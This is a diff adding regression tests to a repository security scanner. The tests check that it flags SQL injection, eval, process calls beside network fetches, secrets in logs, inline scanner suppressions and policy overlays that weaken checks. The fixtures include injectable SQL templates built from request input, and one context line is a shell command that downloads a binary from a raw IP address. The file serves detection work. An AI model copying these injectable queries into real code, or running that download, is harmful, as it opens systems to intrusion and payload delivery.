@@ -111,6 +111,135 @@ class ScannerRegressionTests(unittest.TestCase):
             write(root, "src/db.ts", "await db.query(`SELECT * FROM users WHERE id=${req.params.id}`);\n")
             self.assertIn("POSSIBLE_SQL_INJECTION", rules(self.scan(root)))
 
+    def test_every_sql_injection_site_is_reported_not_just_the_first(self):
+        # Regression: stopping at the first match per file surfaced a commented-out query
+        # in node-api while hiding a live, unauthenticated injection below it.
+        with tempfile.TemporaryDirectory() as td:
+            root = Path(td)
+            write(root, "server/queries.js", (
+                "// pool.query(`select * from s where m = ${month}`);\n"
+                "pool.query(`select * from s where m = ${month}`, cb);\n"
+                "const ok = 1;\n"
+                "pool.query(`SELECT count(*) FROM s WHERE uid LIKE '${req.query.p}%';`, cb);\n"
+                "keys = keys.map(k => `'${k}'`);\n"
+                "pool.query(`SELECT key FROM api_keys WHERE key IN (${keys.join(',')})`, cb);\n"
+            ))
+            lines = sorted(f.line for f in by_rule(self.scan(root), "POSSIBLE_SQL_INJECTION"))
+            self.assertEqual([2, 4, 6], lines)
+
+    def test_sql_built_in_a_variable_is_reported(self):
+        with tempfile.TemporaryDirectory() as td:
+            root = Path(td)
+            write(root, "src/db.js", (
+                "const sql = `DELETE FROM sessions WHERE id = ${req.params.id}`;\n"
+                "await pool.query(sql);\n"
+            ))
+            self.assertEqual([1], [f.line for f in by_rule(self.scan(root), "POSSIBLE_SQL_INJECTION")])
+
+    def test_multiline_query_template_is_one_site(self):
+        with tempfile.TemporaryDirectory() as td:
+            root = Path(td)
+            write(root, "src/db.js", "await pool.query(\n  `SELECT * FROM t WHERE id = ${id}`\n);\n")
+            self.assertEqual(1, len(by_rule(self.scan(root), "POSSIBLE_SQL_INJECTION")))
+
+    def test_prose_and_parameterised_queries_are_not_sql_injection(self):
+        with tempfile.TemporaryDirectory() as td:
+            root = Path(td)
+            write(root, "src/db.js", (
+                "logInfo(`Update ${name} failed`);\n"
+                "pool.query('SELECT * FROM t WHERE id = $1', [id]);\n"
+                "pool.query('SELECT key FROM k WHERE key = ANY($1::text[])', [keys]);\n"
+            ))
+            self.assertNotIn("POSSIBLE_SQL_INJECTION", rules(self.scan(root)))
+
+    def test_comment_skip_cannot_hide_live_code(self):
+        with tempfile.TemporaryDirectory() as td:
+            root = Path(td)
+            write(root, "src/db.js", (
+                "/* */ pool.query(`SELECT * FROM t WHERE id = ${id}`);\n"
+                "class A { #r = pool.query(`SELECT * FROM t WHERE id = ${id}`); }\n"
+            ))
+            self.assertEqual([1, 2], sorted(f.line for f in by_rule(self.scan(root), "POSSIBLE_SQL_INJECTION")))
+
+    def test_every_eval_site_is_reported(self):
+        # A reviewed first call must not be cover for a second one in the same file.
+        with tempfile.TemporaryDirectory() as td:
+            root = Path(td)
+            write(root, "src/x.ts", "eval(a);\nconst ok = 1;\nconst f = new Function(b);\n")
+            self.assertEqual([1, 3], sorted(f.line for f in by_rule(self.scan(root), "DYNAMIC_CODE_EXECUTION")))
+
+    def test_every_process_site_beside_network_is_reported(self):
+        with tempfile.TemporaryDirectory() as td:
+            root = Path(td)
+            write(root, "lib/x.ts",
+                  "import { execSync } from 'child_process';\n"
+                  "const r = await fetch('https://example.com/p');\n"
+                  "execSync('a');\n"
+                  "execSync('b');\n")
+            self.assertEqual([1, 3, 4], sorted(f.line for f in by_rule(self.scan(root), "NETWORK_PROCESS_CHAIN")))
+
+    # --- secrets in logs -----------------------------------------------------
+
+    def secret_log_lines(self, source: str) -> list[int]:
+        with tempfile.TemporaryDirectory() as td:
+            root = Path(td)
+            write(root, "server/index.js", source)
+            return sorted(f.line for f in by_rule(self.scan(root), "SECRET_IN_LOG"))
+
+    def test_api_key_in_log_is_blocked(self):
+        # The node-api shape: every inbound key, valid or not, written to the log file.
+        src = (
+            "const apiKey = req.headers['x-api-key'];\n"
+            "logInfo(`[API Key Check] Received POST with API key: ${apiKey || 'NO KEY PROVIDED'}`);\n"
+            "console.log('token', token);\n"
+            "logger.error('auth failed: ' + req.headers.authorization);\n"
+            "console.log(req.headers['x-api-key']);\n"
+        )
+        self.assertEqual([2, 3, 4, 5], self.secret_log_lines(src))
+        found = by_rule(self.scan_text(src), "SECRET_IN_LOG")
+        self.assertTrue(all(f.severity == "high" for f in found))
+
+    def scan_text(self, source: str):
+        with tempfile.TemporaryDirectory() as td:
+            root = Path(td)
+            write(root, "server/index.js", source)
+            return self.scan(root)
+
+    def test_secret_logging_ignores_prose_flags_and_redaction(self):
+        src = (
+            "logError('No API key provided in x-api-key header');\n"
+            "logger.error('x', JSON.stringify({ allowApiKeyAuth: !!options?.allowApiKeyAuth }));\n"
+            "console.log(`tokens: ${tokenCount}`);\n"
+            "console.log('has token', !!token, token.length);\n"
+            "logInfo(`key: ${maskKey(apiKey)}`);\n"
+            "console.log(`auth ${apiKey ? 'present' : 'missing'}`);\n"
+            "Math.log(passwordStrength);\n"
+            "// console.log(apiKey);\n"
+        )
+        self.assertEqual([], self.secret_log_lines(src))
+
+    def test_secret_logging_spans_multiline_calls(self):
+        src = "logger.info(\n  'login',\n  { user, password },\n);\n"
+        self.assertEqual([1], self.secret_log_lines(src))
+
+    # --- inline scanner suppressions ----------------------------------------
+
+    def test_inline_gitleaks_allow_blocks(self):
+        marker = "gitleaks" + ":allow"
+        with tempfile.TemporaryDirectory() as td:
+            root = Path(td)
+            write(root, "src/config.ts", f"const k = 'AKIAEXAMPLE'; // {marker}\n")
+            hits = by_rule(self.scan(root), "INLINE_SCANNER_SUPPRESSION")
+            self.assertEqual(["high"], [f.severity for f in hits])
+
+    def test_inline_semgrep_suppression_is_reported(self):
+        marker = "no" + "semgrep"
+        with tempfile.TemporaryDirectory() as td:
+            root = Path(td)
+            write(root, "src/x.ts", f"run(x); // {marker}: some-rule\n")
+            hits = by_rule(self.scan(root), "INLINE_SCANNER_SUPPRESSION")
+            self.assertEqual(["medium"], [f.severity for f in hits])
+
     def test_unpinned_action_blocks(self):
         with tempfile.TemporaryDirectory() as td:
             root = Path(td)
@@ -1070,6 +1199,131 @@ class PolinRiderCampaignTests(unittest.TestCase):
             write(root, "tools/setup.sh", "#!/bin/sh\ncurl http://23.27.202.27/p.bin -o /tmp/p.bin\n")
             hits = by_rule(self.scan(root), "SHELL_REMOTE_FETCH")
             self.assertEqual("high", hits[0].severity)
+
+
+class ReviewRegressionTests(unittest.TestCase):
+    """Bypasses reproduced in the October 2026 pipeline review."""
+
+    def scan(self, root: Path, policy: dict | None = None):
+        return scan_repo.scan_repository(root, policy or POLICY, IOCS, None, False, FIXED_TODAY)
+
+    def excepted_policy(self, **extra):
+        p = dict(POLICY)
+        p["exceptions"] = [{"rule": "DYNAMIC_CODE_EXECUTION", "paths": ["app/x.ts"],
+                            "reason": "Reviewed sandboxed evaluator.", "expires": "2027-03-01", **extra}]
+        return p
+
+    def test_exception_does_not_cover_a_second_site_added_later(self):
+        with tempfile.TemporaryDirectory() as td:
+            root = Path(td)
+            write(root, "app/x.ts", "eval(a);\n")
+            self.assertFalse(blocking(self.scan(root, self.excepted_policy())))
+            write(root, "app/x.ts", "eval(a);\neval(b);\n")
+            hits = by_rule(self.scan(root, self.excepted_policy()), "DYNAMIC_CODE_EXECUTION")
+            self.assertEqual(["high", "high"], [f.severity for f in hits])
+            self.assertIn("covers 1 site", hits[0].message)
+
+    def test_exception_sites_count_is_honoured(self):
+        with tempfile.TemporaryDirectory() as td:
+            root = Path(td)
+            write(root, "app/x.ts", "eval(a);\neval(b);\n")
+            hits = by_rule(self.scan(root, self.excepted_policy(sites=2)), "DYNAMIC_CODE_EXECUTION")
+            self.assertEqual(["info", "info"], [f.severity for f in hits])
+
+    def test_invalid_sites_value_is_rejected(self):
+        with tempfile.TemporaryDirectory() as td:
+            root = Path(td)
+            write(root, "app/x.ts", "eval(a);\n")
+            for bad in (0, -1, 51, "2", True):
+                self.assertIn("EXCEPTION_INVALID", rules(self.scan(root, self.excepted_policy(sites=bad))), bad)
+
+    def test_unrelated_sanitizer_does_not_hide_a_raw_secret(self):
+        with tempfile.TemporaryDirectory() as td:
+            root = Path(td)
+            write(root, "server/a.js", "console.log(hash(user.id), apiKey);\nconsole.log(hash(apiKey));\n")
+            self.assertEqual([1], [f.line for f in by_rule(self.scan(root), "SECRET_IN_LOG")])
+
+    def test_undotted_osv_config_is_a_security_control(self):
+        self.assertIn("osv-scanner.toml", scan_repo.SENSITIVE_CONFIG_NAMES)
+        self.assertIn(".osv-scanner.toml", scan_repo.SENSITIVE_CONFIG_NAMES)
+
+    def test_overlay_cannot_switch_checks_off_or_raise_limits(self):
+        for key, value in (("run_tests_if_present", False), ("verify_npm_registry_signatures", False),
+                           ("require_npm_lock_integrity", False), ("require_test_script_when_tests_present", False),
+                           ("allow_git_dependencies", True), ("max_line_length", 10 ** 9),
+                           ("hidden_whitespace_run", 10 ** 6), ("max_text_file_bytes", "big")):
+            merged, findings = scan_repo.merge_policy(POLICY, {key: value})
+            self.assertEqual(POLICY[key], merged[key], key)
+            self.assertIn("POLICY_OVERLAY_WEAKENED", rules(findings), key)
+
+    def test_overlay_may_tighten_limits(self):
+        merged, findings = scan_repo.merge_policy(POLICY, {"max_line_length": 100})
+        self.assertEqual(100, merged["max_line_length"])
+        self.assertEqual([], findings)
+
+
+class SecondReviewRegressionTests(unittest.TestCase):
+    """Bypasses reproduced in the second October 2026 review."""
+
+    def scan(self, root: Path, policy: dict | None = None):
+        return scan_repo.scan_repository(root, policy or POLICY, IOCS, None, False, FIXED_TODAY)
+
+    def lines(self, source: str, rule: str, path: str = "server/a.js") -> list[int]:
+        with tempfile.TemporaryDirectory() as td:
+            root = Path(td)
+            write(root, path, source)
+            return sorted(f.line for f in by_rule(self.scan(root), rule))
+
+    def test_two_calls_on_one_line_are_two_findings(self):
+        self.assertEqual([1, 1], self.lines("logger.error(apiKey); logger.error(password);\n", "SECRET_IN_LOG"))
+        self.assertEqual([1, 1], self.lines("eval(a); eval(b);\n", "DYNAMIC_CODE_EXECUTION", "app/x.ts"))
+        self.assertEqual([1, 1], self.lines(
+            "db.query(`SELECT * FROM a WHERE x=${x}`); db.query(`SELECT * FROM b WHERE y=${y}`);\n",
+            "POSSIBLE_SQL_INJECTION"))
+
+    def test_sites_one_does_not_cover_two_calls_on_one_line(self):
+        policy = dict(POLICY)
+        policy["exceptions"] = [{"rule": "DYNAMIC_CODE_EXECUTION", "paths": ["app/x.ts"],
+                                 "reason": "Reviewed sandboxed evaluator.", "expires": "2027-03-01"}]
+        with tempfile.TemporaryDirectory() as td:
+            root = Path(td)
+            write(root, "app/x.ts", "eval(a); eval(b);\n")
+            self.assertEqual(2, len(blocking(self.scan(root, policy))))
+
+    def test_masked_bracket_key_is_not_a_secret(self):
+        self.assertEqual([], self.lines('logger.error(mask(req.headers["x-api-key"]));\n', "SECRET_IN_LOG"))
+
+    def test_unmasked_bracket_key_is_a_secret(self):
+        self.assertEqual([1], self.lines('logger.error(req.headers["x-api-key"]);\n', "SECRET_IN_LOG"))
+
+    def test_optional_chaining_and_nullish_log_the_value(self):
+        self.assertEqual([1, 2], self.lines(
+            "logger.error(apiKey?.trim());\nlogger.error(apiKey ?? 'none');\n", "SECRET_IN_LOG"))
+        self.assertEqual([], self.lines("logger.error(apiKey?.length, !!apiKey);\n", "SECRET_IN_LOG"))
+
+    def test_overlay_cannot_widen_artifact_globs(self):
+        with tempfile.TemporaryDirectory() as td:
+            root = Path(td)
+            write(root, "src/a.ts", "eval(input);\n")
+            merged, findings = scan_repo.merge_policy(POLICY, {"artifact_globs": ["**"]})
+            self.assertIn("POLICY_OVERLAY_WEAKENED", rules(findings))
+            self.assertEqual(POLICY["artifact_globs"], merged["artifact_globs"])
+            self.assertIn("DYNAMIC_CODE_EXECUTION", rules(self.scan(root, merged)))
+
+    def test_overlay_may_narrow_artifact_globs(self):
+        merged, findings = scan_repo.merge_policy(POLICY, {"artifact_globs": ["build/**"]})
+        self.assertEqual(["build/**"], merged["artifact_globs"])
+        self.assertEqual([], findings)
+
+    def test_overlay_cannot_set_central_only_keys(self):
+        for key, value in (("sensitive_review_label", "ok"), ("some_future_knob", False)):
+            merged, findings = scan_repo.merge_policy(POLICY, {key: value})
+            self.assertIn("POLICY_OVERLAY_WEAKENED", rules(findings), key)
+            self.assertEqual(POLICY.get(key), merged.get(key), key)
+
+    def test_comment_keys_are_allowed(self):
+        _, findings = scan_repo.merge_policy(POLICY, {"_comment": ["x"], "exceptions": []})
+        self.assertEqual([], findings)
 
 
 if __name__ == "__main__":
